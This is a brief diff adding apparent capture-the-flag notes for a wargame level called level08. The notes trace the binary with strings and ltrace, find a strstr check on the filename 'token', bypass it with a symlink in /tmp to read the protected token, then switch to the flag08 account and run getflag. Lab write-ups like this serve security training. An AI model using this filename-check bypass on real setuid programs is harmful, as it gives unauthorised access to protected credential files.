@@ -1,0 +1,15 @@
+strings level08
+ltrace ./level08 token
+there is an check for strstr("namefile", "token")
+
+try with an symlink to token..
+
+ln -s /home/user/level08/token /tmp/pass
+
+./level08 /tmp/pass
+
+su flag08
+
+getflag
+
+good to go
